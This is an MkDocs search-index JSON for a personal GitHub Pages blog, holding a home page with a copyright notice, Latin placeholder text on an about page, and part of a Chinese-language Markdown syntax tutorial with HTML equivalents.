{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to Jerry's blog \uf0c1 Project documentation with Markdown. I set up a basic GitHub Pages site for myself in https://jerry-se.github.io/ . Whenever I commit to my repository, mkdocs will rebuild the pages in my site, from the content in my Markdown files. Blog source files are written in markdown, for more details see Basic writing and formatting syntax . Support or Contact \uf0c1 Having trouble with Pages? Check out github's documentation or contact support to resolve the issue. Finally, you can email me for help. Copyright Notice \uf0c1 Share Internet technology, spread value and positive energy, please respect the legitimate rights and interests of authors. This blog is a personal blog and does not involve commercial use. It only provides learning reference. The content is from personal originality and Internet reprints and excerpts. Not for commercial use and traditional media without my permission. Please indicate the source and link for online media or personal reprinting, otherwise it is an infringement. No individual or organization may build a mirror image of this site, illegally collect hotlinks, or tamper with or decompile software. All original copyrights on this site belong to my blog, and I reserve the right to pursue legal prosecution for copyright infringement!","title":"Home"},{"location":"#welcome-to-jerrys-blog","text":"Project documentation with Markdown. I set up a basic GitHub Pages site for myself in https://jerry-se.github.io/ . Whenever I commit to my repository, mkdocs will rebuild the pages in my site, from the content in my Markdown files. Blog source files are written in markdown, for more details see Basic writing and formatting syntax .","title":"Welcome to Jerry's blog"},{"location":"#support-or-contact","text":"Having trouble with Pages? Check out github's documentation or contact support to resolve the issue. Finally, you can email me for help.","title":"Support or Contact"},{"location":"#copyright-notice","text":"Share Internet technology, spread value and positive energy, please respect the legitimate rights and interests of authors. This blog is a personal blog and does not involve commercial use. It only provides learning reference. The content is from personal originality and Internet reprints and excerpts. Not for commercial use and traditional media without my permission. Please indicate the source and link for online media or personal reprinting, otherwise it is an infringement. No individual or organization may build a mirror image of this site, illegally collect hotlinks, or tamper with or decompile software. All original copyrights on this site belong to my blog, and I reserve the right to pursue legal prosecution for copyright infringement!","title":"Copyright Notice"},{"location":"about/","text":"Hoc obstaret in aeris ferinae \uf0c1 Traiecta margine timorem mutavit gladios forma ita \uf0c1 Lorem markdownum quondam quaque strepitans quaeque et tandem illa discedunt est ipse, via meae. Ferarum lilia, ambierantque clipeo ebrietas dotem. Domus morientibus verba: ora Phoenix longe Troiae, viso sed a. Marmore divae maius ! Hausit ipse luminis sed, ille effigies omnes? Hos carina admirantes tenues Aglauros proque manus, laniaverat multa tenuere et sensit, cur quia pellis vias inquit. Det causa nebulas, et liquebat anguem se erravit mulcet, saevo mente magno. Taedasque Cephea Eetioneas totiens premebat ; ultra si mortale mihi, sed fulmen aspera indignos simulatas annus. Hac secunda advena ipse fuit castris ad , et veniam velare inpiger. Fallente Pactolonque solent fallitque oblita \uf0c1 Domuit sua bello peremi mediis. Vir fidem sidera. Cinis primus tendentem corpus hoc indueret acerbo ob Agenore lectum Venusque Asopida artus; quis. Illuc rupibus inprobe frustra corpus faenilibus possemque Ianthe puteisque saepius inpositus porrigeret Procne iunxit. Iam sidereum misit hirtus interque ut perdere dedimus numinis sublimia sensit concordi sua Daedalion Icare, eripuit forsitan, aliquis. Passis nisi videri cavernas mactatos nunc; oculisque longa; ut finire et Iove geminas. Nitido caput fontis multiplicique ignis Veneris inducto ritus, Belo ruere Victoria temptat soporis. Rex tibi perlucida valeant, proculcat praeterit, et gelidi alis iunctissima parte restat. Qui fuit metu laqueique cumque advertitur tenui postquam. Illi purpureis colla nostras Dixerat tenebas. Quam Canentis isto honorant metu avus; flumina tu aliae soror vulnera: dapes Venus. Non callem dolore adfata dixit naufragus sacros \uf0c1 Dumque de nova et liventia sequemur, novitasque fulvo pacis dixit stipite praebebat tabo. Oscula paludes, ignis nam caputque procubuit clauserat omnesque videntem. Nihil et Alpheias nomen quae donec carpebam ne extrema quem frustra: mersum suo et pocula. Erravit haec heu cognovi adulterium, quis Achille. Ea unda lympha abi ni rapitur cui : primum arceat, Astyanax dictas iugulare et causam, exit. Ferre teste petisses caedis, praesagaque ultima undae; scilicet esse fugerat dicenti tristia, orbe grates. Cape lapillis ut incipit mendacique tecum in mare quippe iunctam, at quem. Non meae, sed iterum non potior se meruere veluti inproba. Tu Nixique pacatum falsam , videtque, ut, tibi! Est ilia quas robora et bibulaque nasci et tibiaque, eligit! Ille silvarum Peleus Achaemenides piaeque vana. Ruit cupido, ab vultus Cepheus dubito spoliantis gratissima Oenopiam, quis. Victor contigerant tectus affata.","title":"Hoc obstaret in aeris ferinae"},{"location":"about/#hoc-obstaret-in-aeris-ferinae","text":"","title":"Hoc obstaret in aeris ferinae"},{"location":"about/#traiecta-margine-timorem-mutavit-gladios-forma-ita","text":"Lorem markdownum quondam quaque strepitans quaeque et tandem illa discedunt est ipse, via meae. Ferarum lilia, ambierantque clipeo ebrietas dotem. Domus morientibus verba: ora Phoenix longe Troiae, viso sed a. Marmore divae maius ! Hausit ipse luminis sed, ille effigies omnes? Hos carina admirantes tenues Aglauros proque manus, laniaverat multa tenuere et sensit, cur quia pellis vias inquit. Det causa nebulas, et liquebat anguem se erravit mulcet, saevo mente magno. Taedasque Cephea Eetioneas totiens premebat ; ultra si mortale mihi, sed fulmen aspera indignos simulatas annus. Hac secunda advena ipse fuit castris ad , et veniam velare inpiger.","title":"Traiecta margine timorem mutavit gladios forma ita"},{"location":"about/#fallente-pactolonque-solent-fallitque-oblita","text":"Domuit sua bello peremi mediis. Vir fidem sidera. Cinis primus tendentem corpus hoc indueret acerbo ob Agenore lectum Venusque Asopida artus; quis. Illuc rupibus inprobe frustra corpus faenilibus possemque Ianthe puteisque saepius inpositus porrigeret Procne iunxit. Iam sidereum misit hirtus interque ut perdere dedimus numinis sublimia sensit concordi sua Daedalion Icare, eripuit forsitan, aliquis. Passis nisi videri cavernas mactatos nunc; oculisque longa; ut finire et Iove geminas. Nitido caput fontis multiplicique ignis Veneris inducto ritus, Belo ruere Victoria temptat soporis. Rex tibi perlucida valeant, proculcat praeterit, et gelidi alis iunctissima parte restat. Qui fuit metu laqueique cumque advertitur tenui postquam. Illi purpureis colla nostras Dixerat tenebas. Quam Canentis isto honorant metu avus; flumina tu aliae soror vulnera: dapes Venus.","title":"Fallente Pactolonque solent fallitque oblita"},{"location":"about/#non-callem-dolore-adfata-dixit-naufragus-sacros","text":"Dumque de nova et liventia sequemur, novitasque fulvo pacis dixit stipite praebebat tabo. Oscula paludes, ignis nam caputque procubuit clauserat omnesque videntem. Nihil et Alpheias nomen quae donec carpebam ne extrema quem frustra: mersum suo et pocula. Erravit haec heu cognovi adulterium, quis Achille. Ea unda lympha abi ni rapitur cui : primum arceat, Astyanax dictas iugulare et causam, exit. Ferre teste petisses caedis, praesagaque ultima undae; scilicet esse fugerat dicenti tristia, orbe grates. Cape lapillis ut incipit mendacique tecum in mare quippe iunctam, at quem. Non meae, sed iterum non potior se meruere veluti inproba. Tu Nixique pacatum falsam , videtque, ut, tibi! Est ilia quas robora et bibulaque nasci et tibiaque, eligit! Ille silvarum Peleus Achaemenides piaeque vana. Ruit cupido, ab vultus Cepheus dubito spoliantis gratissima Oenopiam, quis. Victor contigerant tectus affata.","title":"Non callem dolore adfata dixit naufragus sacros"},{"location":"markdown/","text":"Markdown \u6559\u7a0b \uf0c1 \u672c\u4eba\u5173\u4e8e\u4f7f\u7528Markdown\u7684\u603b\u7ed3\u3002 1. \u7b80\u4ecb \uf0c1 Markdown \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\uff0c\u5141\u8bb8\u4eba\u4eec\u4f7f\u7528\u6613\u8bfb\u6613\u5199\u7684\u7eaf\u6587\u672c\u683c\u5f0f\u7f16\u5199\u6587\u6863\u3002 \u5728 2004 \u7531\u7ea6\u7ff0\u00b7\u683c\u9c81\u4f2f\uff08\u82f1\u8bed\uff1aJohn Gruber\uff09\u521b\u5efa\u3002 \u53ef\u4e0eHTML\u6df7\u7f16\uff0c\u53ef\u5bfc\u51fa HTML\u3001PDF \u4ee5\u53ca\u672c\u8eab\u7684 .md \u683c\u5f0f\u7684\u6587\u4ef6\u3002 \u56e0\u7b80\u6d01\u3001\u9ad8\u6548\u3001\u6613\u8bfb\u3001\u6613\u5199\uff0cMarkdown\u88ab\u5927\u91cf\u4f7f\u7528\uff0c\u5982Github\u3001Wikipedia\u3001\u7b80\u4e66\u7b49\u3002 \u6709\u5173\u8bed\u6cd5\u89c4\u5219\uff0c\u8bf7\u53c2\u9605 John \u7684 \u8bed\u6cd5\u6587\u6863 \u3002 2. \u57fa\u672c\u8bed\u6cd5 \uf0c1 2.1. \u6807\u9898 \uf0c1 \u8981\u521b\u5efa\u6807\u9898\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u524d\u9762\u6dfb\u52a0\u4e95\u53f7 ( # ) \u3002 # \u7684\u6570\u91cf\u4ee3\u8868\u4e86\u6807\u9898\u7684\u7ea7\u522b\u3002\u4f8b\u5982\uff0c\u6dfb\u52a0\u4e09\u4e2a # \u8868\u793a\u521b\u5efa\u4e00\u4e2a\u4e09\u7ea7\u6807\u9898 ( <h3> ) (\u4f8b\u5982\uff1a ### My Header )\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c # Heading level 1 <h1>Heading level 1</h1> Heading level 1 ## Heading level 2 <h2>Heading level 2</h2> Heading level 2 ### Heading level 3 <h3>Heading level 3</h3> Heading level 3 #### Heading level 4 <h4>Heading level 4</h4> Heading level 4 ##### Heading level 5 <h5>Heading level 5</h5> Heading level 5 ###### Heading level 6 <h6>Heading level 6</h6> Heading level 6 \u8fd8\u53ef\u4ee5\u5728\u6587\u672c\u4e0b\u65b9\u6dfb\u52a0\u4efb\u610f\u6570\u91cf\u7684 == \u53f7\u6765\u6807\u8bc6\u4e00\u7ea7\u6807\u9898\uff0c\u6216\u8005 -- \u53f7\u6765\u6807\u8bc6\u4e8c\u7ea7\u6807\u9898\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c Heading level 1 =============== <h1>Heading level 1</h1> Heading level 1 Heading level 2 --------------- <h2>Heading level 2</h2> Heading level 2 \u4e0d\u540c\u7684 Markdown \u5e94\u7528\u7a0b\u5e8f\u5904\u7406 # \u548c\u6807\u9898\u4e4b\u95f4\u7684\u7a7a\u683c\u65b9\u5f0f\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u4e86\u517c\u5bb9\u8003\u8651\uff0c\u8bf7\u7528\u4e00\u4e2a\u7a7a\u683c\u5728 # \u548c\u6807\u9898\u4e4b\u95f4\u8fdb\u884c\u5206\u9694\u3002 2.2. \u6bb5\u843d\u548c\u6362\u884c \uf0c1 2.2.1. \u6bb5\u843d \uf0c1 \u8981\u521b\u5efa\u6bb5\u843d\uff0c\u8bf7\u4f7f\u7528\u7a7a\u767d\u884c\u5c06\u4e00\u884c\u6216\u591a\u884c\u6587\u672c\u8fdb\u884c\u5206\u9694\u3002 \u4e0d\u8981\u7528\u7a7a\u683c\uff08spaces\uff09\u6216\u5236\u8868\u7b26\uff08 tabs\uff09\u7f29\u8fdb\u6bb5\u843d\u3002 2.2.2. \u6362\u884c \uf0c1 \u5728\u4e00\u884c\u7684\u672b\u5c3e\u6dfb\u52a0\u4e24\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\uff0c\u7136\u540e\u6309\u56de\u8f66\u952e,\u5373\u53ef\u521b\u5efa\u4e00\u4e2a\u6362\u884c( <br> )\u3002 \u51e0\u4e4e\u6bcf\u4e2a Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u4e24\u4e2a\u6216\u591a\u4e2a\u7a7a\u683c\u8fdb\u884c\u6362\u884c\uff0c\u79f0\u4e3a \u7ed3\u5c3e\u7a7a\u683c\uff08trailing whitespace) \u7684\u65b9\u5f0f\uff0c\u4f46\u8fd9\u662f\u6709\u4e89\u8bae\u7684\uff0c\u56e0\u4e3a\u5f88\u96be\u5728\u7f16\u8f91\u5668\u4e2d\u76f4\u63a5\u770b\u5230\u7a7a\u683c\uff0c\u5e76\u4e14\u5f88\u591a\u4eba\u5728\u6bcf\u4e2a\u53e5\u5b50\u540e\u9762\u90fd\u4f1a\u6709\u610f\u6216\u65e0\u610f\u5730\u6dfb\u52a0\u4e24\u4e2a\u7a7a\u683c\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4f60\u53ef\u80fd\u8981\u4f7f\u7528\u9664\u7ed3\u5c3e\u7a7a\u683c\u4ee5\u5916\u7684\u5176\u5b83\u65b9\u5f0f\u6765\u6362\u884c\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u51e0\u4e4e\u6bcf\u4e2a Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u53e6\u4e00\u79cd\u6362\u884c\u65b9\u5f0f\uff1aHTML \u7684 <br> \u6807\u7b7e\u3002 \u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8bf7\u5728\u884c\u5c3e\u6dfb\u52a0\u201c\u7ed3\u5c3e\u7a7a\u683c\u201d\u6216 HTML \u7684 <br> \u6807\u7b7e\u6765\u5b9e\u73b0\u6362\u884c\u3002 2.3. \u5b57\u4f53 \uf0c1 \u901a\u8fc7\u5c06\u6587\u672c\u8bbe\u7f6e\u4e3a\u7c97\u4f53\u6216\u659c\u4f53\u6765\u5f3a\u8c03\u5176\u91cd\u8981\u6027\u3002 2.3.1. \u7c97\u4f53 \uf0c1 \u8981\u52a0\u7c97\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u524d\u540e\u5404\u6dfb\u52a0\u4e24\u4e2a\u661f\u53f7\uff08asterisks\uff09\u6216\u4e0b\u5212\u7ebf\uff08underscores\uff09\u3002\u5982\u9700\u52a0\u7c97\u4e00\u4e2a\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\u7528\u4ee5\u8868\u793a\u5f3a\u8c03\u7684\u8bdd\uff0c\u8bf7\u5728\u8981\u52a0\u7c97\u90e8\u5206\u7684\u4e24\u4fa7\u5404\u6dfb\u52a0\u4e24\u4e2a\u661f\u53f7\uff08asterisks\uff09\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c I just love **bold text**. I just love <strong>bold text</strong>. I just love bold text . I just love __bold text__. I just love <strong>bold text</strong>. I just love bold text . Love**is**bold Love<strong>is</strong>bold Love is bold Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5982\u4f55\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u517c\u5bb9\u8003\u8651\uff0c\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u90e8\u5206\u52a0\u7c97\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\uff08asterisks\uff09\u3002 \u2705 Do this \u274c Don't do this Love**is**bold Love__is__bold 2.3.2. \u659c\u4f53 \uf0c1 \u8981\u7528\u659c\u4f53\u663e\u793a\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u524d\u540e\u6dfb\u52a0\u4e00\u4e2a\u661f\u53f7\uff08asterisk\uff09\u6216\u4e0b\u5212\u7ebf\uff08underscore\uff09\u3002\u8981\u659c\u4f53\u7a81\u51fa\u5355\u8bcd\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8bf7\u5728\u5b57\u6bcd\u524d\u540e\u5404\u6dfb\u52a0\u4e00\u4e2a\u661f\u53f7\uff0c\u4e2d\u95f4\u4e0d\u8981\u5e26\u7a7a\u683c\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c Italicized text is the *cat's meow*. Italicized text is the <em>cat's meow</em>. Italicized text is the cat's meow . Italicized text is the _cat's meow_. Italicized text is the <em>cat's meow</em>. Italicized text is the cat's meow . A*cat*meow A<em>cat</em>meow A cat meow Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5982\u4f55\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u517c\u5bb9\u8003\u8651\uff0c\u8981\u659c\u4f53\u7a81\u51fa\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u90e8\u5206\u7684\u8bdd\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\uff08asterisks\uff09\u3002 \u2705 Do this \u274c Don't do this A*cat*meow A_cat_meow \u8981\u540c\u65f6\u7528\u7c97\u4f53\u548c\u659c\u4f53\u7a81\u51fa\u663e\u793a\u6587\u672c\uff0c\u8bf7\u5728\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u524d\u540e\u5404\u6dfb\u52a0\u4e09\u4e2a\u661f\u53f7\u6216\u4e0b\u5212\u7ebf\u3002\u8981\u52a0\u7c97\u5e76\u7528\u659c\u4f53\u663e\u793a\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8bf7\u5728\u8981\u7a81\u51fa\u663e\u793a\u7684\u90e8\u5206\u524d\u540e\u5404\u6dfb\u52a0\u4e09\u4e2a\u661f\u53f7\uff0c\u4e2d\u95f4\u4e0d\u8981\u5e26\u7a7a\u683c\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c This text is ***really important***. This text is <strong><em>really important</em></strong>. This text is really important . This text is ___really important___. This text is <strong><em>really important</em></strong>. This text is really important . This text is __*really important*__. This text is <strong><em>really important</em></strong>. This text is really important . This text is **_really important_**. This text is <strong><em>really important</em></strong>. This text is really important . This is really***very***important text. This is really<strong><em>very</em></strong>important text. This is really very important text. Markdown \u5e94\u7528\u7a0b\u5e8f\u5728\u5904\u7406\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u95f4\u6dfb\u52a0\u7684\u4e0b\u5212\u7ebf\u4e0a\u5e76\u4e0d\u4e00\u81f4\u3002\u4e3a\u4e86\u5b9e\u73b0\u517c\u5bb9\u6027\uff0c\u8bf7\u4f7f\u7528\u661f\u53f7\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u7684\u4e2d\u95f4\u90e8\u5206\u52a0\u7c97\u5e76\u4ee5\u659c\u4f53\u663e\u793a\uff0c\u4ee5\u793a\u91cd\u8981\u3002 \u2705 Do this \u274c Don't do this This is really***very***important text. This is really___very___important text. 2.3.3. \u4e0b\u5212\u7ebf \uf0c1 \u4e0b\u5212\u7ebf\u53ef\u4ee5\u901a\u8fc7 HTML \u7684 <u> \u6807\u7b7e\u6765\u5b9e\u73b0\uff1a HTML \u9884\u89c8\u6548\u679c <u>\u5e26\u4e0b\u5212\u7ebf\u6587\u672c</u> \u5e26\u4e0b\u5212\u7ebf\u6587\u672c 2.4. \u5757\u5f15\u7528 \uf0c1 \u8981\u521b\u5efa\u5757\u5f15\u7528\uff0c\u8bf7\u5728\u6bb5\u843d\u524d\u6dfb\u52a0\u4e00\u4e2a > \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\u6240\u793a\uff1a Dorothy followed her through many of the beautiful rooms in her castle. \u5757\u5f15\u7528\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u6bb5\u843d\u3002\u4e3a\u6bb5\u843d\u4e4b\u95f4\u7684\u7a7a\u767d\u884c\u6dfb\u52a0\u4e00\u4e2a > \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. > > The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a Dorothy followed her through many of the beautiful rooms in her castle. The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u5757\u5f15\u7528\u53ef\u4ee5\u5d4c\u5957\u3002\u5728\u8981\u5d4c\u5957\u7684\u6bb5\u843d\u524d\u6dfb\u52a0\u4e00\u4e2a >> \u7b26\u53f7\u3002 > Dorothy followed her through many of the beautiful rooms in her castle. > >> The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a Dorothy followed her through many of the beautiful rooms in her castle. The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood. \u5757\u5f15\u7528\u53ef\u4ee5\u5305\u542b\u5176\u4ed6 Markdown \u683c\u5f0f\u7684\u5143\u7d20\u3002\u5e76\u975e\u6240\u6709\u5143\u7d20\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f60\u9700\u8981\u8fdb\u884c\u5b9e\u9a8c\u4ee5\u67e5\u770b\u54ea\u4e9b\u5143\u7d20\u6709\u6548\u3002 > #### The quarterly results look great! > > - Revenue was off the chart. > - Profits were higher than ever. > > *Everything* is going according to **plan**. \u6e32\u67d3\u6548\u679c\u5982\u4e0b\uff1a The quarterly results look great! \uf0c1 Revenue was off the chart. Profits were higher than ever. Everything is going according to plan . 2.5. \u5217\u8868 \uf0c1 \u53ef\u4ee5\u5c06\u591a\u4e2a\u6761\u76ee\u7ec4\u7ec7\u6210\u6709\u5e8f\u6216\u65e0\u5e8f\u5217\u8868\u3002 2.5.1. \u6709\u5e8f\u5217\u8868 \uf0c1 \u8981\u521b\u5efa\u6709\u5e8f\u5217\u8868\uff0c\u8bf7\u5728\u6bcf\u4e2a\u5217\u8868\u9879\u524d\u6dfb\u52a0\u6570\u5b57\u5e76\u7d27\u8ddf\u4e00\u4e2a\u82f1\u6587\u53e5\u70b9\u3002\u6570\u5b57\u4e0d\u5fc5\u6309\u6570\u5b66\u987a\u5e8f\u6392\u5217\uff0c\u4f46\u662f\u5217\u8868\u5e94\u5f53\u4ee5\u6570\u5b57 1 \u8d77\u59cb\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c 1. First item 2. Second item 3. Third item 4. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ol> First item Second item Third item Fourth item 1. First item 8. Second item 3. Third item 5. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ol> First item Second item Third item Fourth item 1. First item 2. Second item 3. Third item 1. Indented item 2. Indented item 4. Fourth item <ol> <li>First item</li> <li>Second item</li> <li>Third item <ol> <li>Indented item</li> <li>Indented item</li> </ol> </li> <li>Fourth item</li> </ol> First item Second item Third item Indented item Indented item Fourth item CommonMark \u548c\u5176\u4ed6\u4e00\u4e9b\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u5141\u8bb8\u60a8\u4f7f\u7528\u62ec\u53f7 ( ) ) \u4f5c\u4e3a\u5206\u9694\u7b26\uff08\u4f8b\u5982\uff0c 1) First item \uff09\uff0c\u4f46\u5e76\u975e\u6240\u6709 Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u8fd9\u4e00\u70b9\uff0c\u56e0\u6b64\u4ece\u517c\u5bb9\u6027\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u9009\u62e9\u3002\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u4ec5\u4f7f\u7528\u53e5\u70b9\u3002 \u2705 Do this \u274c Don't do this 1. First item 2. Second item 1) First item 2) Second item 2.5.2. \u65e0\u5e8f\u5217\u8868 \uf0c1 \u8981\u521b\u5efa\u65e0\u5e8f\u5217\u8868\uff0c\u8bf7\u5728\u6bcf\u4e2a\u5217\u8868\u9879\u524d\u9762\u6dfb\u52a0\u7834\u6298\u53f7 (-)\u3001\u661f\u53f7 (*) \u6216\u52a0\u53f7 (+) \u3002\u7f29\u8fdb\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u8868\u9879\u53ef\u521b\u5efa\u5d4c\u5957\u5217\u8868\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c - First item - Second item - Third item - Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item * First item * Second item * Third item * Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item + First item + Second item + Third item + Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item</li> <li>Fourth item</li> </ul> First item Second item Third item Fourth item - First item - Second item - Third item - Indented item - Indented item - Fourth item <ul> <li>First item</li> <li>Second item</li> <li>Third item <ul> <li>Indented item</li> <li>Indented item</li> </ul> </li> <li>Fourth item</li> </ul> First item Second item Third item Indented item Indented item Fourth item Markdown \u5e94\u7528\u7a0b\u5e8f\u4e0d\u540c\u610f\u5982\u4f55\u5904\u7406\u540c\u4e00\u5217\u8868\u4e2d\u7684\u4e0d\u540c\u5206\u9694\u7b26\u3002\u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u4e0d\u8981\u5728\u540c\u4e00\u4e2a\u5217\u8868\u4e2d\u6df7\u5408\u548c\u5339\u914d\u5206\u9694\u7b26 -- \u9009\u62e9\u4e00\u4e2a\u5e76\u575a\u6301\u4f7f\u7528\u5b83\u3002 \u2705 Do this \u274c Don't do this - First item - Second item - Third item - Fourth item + First item * Second item - Third item + Fourth item 2.5.3. \u5728\u5217\u8868\u4e2d\u5d4c\u5957\u5176\u4ed6\u5143\u7d20 \uf0c1 \u8981\u5728\u4fdd\u7559\u5217\u8868\u8fde\u7eed\u6027\u7684\u540c\u65f6\u5728\u5217\u8868\u4e2d\u6dfb\u52a0\u53e6\u4e00\u79cd\u5143\u7d20\uff0c\u8bf7\u5c06\u8be5\u5143\u7d20\u7f29\u8fdb\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\uff0c\u5982\u4e0b\u4f8b\u6240\u793a\uff1a * This is the first list item. * Here's the second list item. I need to add another paragraph below the second list item. > A blockquote would look great below the second list item. <html> <head> <title>Test</title> </head> </html> ![Tux, the Linux mascot](/img/tux.png) 1. First item 2. Second item 3. Third item 4. Fourth item * And here's the third list item. This is the first list item. Here's the second list item. I need to add another paragraph below the second list item. A blockquote would look great below the second list item. <html> <head> <title>Test</title> </head> </html> First item Second item Third item Fourth item And here's the third list item. 2.6. \u4ee3\u7801\u8bed\u6cd5 \uf0c1 \u8981\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u8868\u793a\u4e3a\u4ee3\u7801\uff0c\u8bf7\u5c06\u5176\u5305\u88f9\u5728\u53cd\u5f15\u53f7 ( ` ) \u4e2d\u3002 \u5982\u679c\u4f60\u8981\u8868\u793a\u4e3a\u4ee3\u7801\u7684\u5355\u8bcd\u6216\u77ed\u8bed\u4e2d\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u53cd\u5f15\u53f7\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u5c06\u5355\u8bcd\u6216\u77ed\u8bed\u5305\u88f9\u5728\u53cc\u53cd\u5f15\u53f7( `` )\u4e2d\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c At the command prompt, type `nano`. At the command prompt, type <code>nano</code>. At the command prompt, type nano . ``Use `code` in your Markdown file.`` <code>Use `code` in your Markdown file.</code> Use `code` in your Markdown file. \u8981\u521b\u5efa\u4ee3\u7801\u5757\uff0c\u8bf7\u5c06\u4ee3\u7801\u5757\u7684\u6bcf\u4e00\u884c\u7f29\u8fdb\u81f3\u5c11\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\u3002 <html> <head> </head> </html> <html> <head> </head> </html> Note: \u8981\u521b\u5efa\u4e0d\u7528\u7f29\u8fdb\u7684\u4ee3\u7801\u5757\uff0c\u8bf7\u4f7f\u7528 \u56f4\u680f\u5f0f\u4ee3\u7801\u5757\uff08fenced code blocks\uff09 . 2.7. \u5206\u9694\u7ebf \uf0c1 \u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u4e00\u884c\u4e0a\u5355\u72ec\u653e\u7f6e\u4e09\u4e2a\u6216\u66f4\u591a\u8fde\u5b57\u7b26 ( --- ) \u3001\u661f\u53f7 ( *** )\u6216\u4e0b\u5212\u7ebf ( ___ )\u6765\u751f\u6210\u6c34\u5e73\u89c4\u5219\u6807\u8bb0 ( <hr /> )\u3002 \u5982\u679c\u60a8\u613f\u610f\uff0c\u53ef\u4ee5\u5728 - \u6216 * \u4e4b\u95f4\u4f7f\u7528\u7a7a\u683c\u3002\u4ee5\u4e0b\u6bcf\u4e00\u884c\u90fd\u4f1a\u4ea7\u751f\u4e00\u6761\u6c34\u5e73\u7ebf\uff1a * * * *** ***** - - - --------------------------------------- _________________ \u4e3a\u4e86\u517c\u5bb9\u6027\uff0c\u8bf7\u5728\u5206\u9694\u7ebf\u7684\u524d\u540e\u5747\u6dfb\u52a0\u7a7a\u767d\u884c\u3002 2.8. \u94fe\u63a5\u8bed\u6cd5 \uf0c1 Markdown \u652f\u6301\u4e24\u79cd\u6837\u5f0f\u7684\u94fe\u63a5\uff1a\u5185\u8054(inline)\u548c\u5f15\u7528(reference)\u3002\u5728\u8fd9\u4e24\u79cd\u6837\u5f0f\u4e2d\uff0c\u94fe\u63a5\u6587\u672c\u7531 [\u65b9\u62ec\u53f7] \u5206\u9694\u3002 2.8.1. \u5185\u8054\u94fe\u63a5 \uf0c1 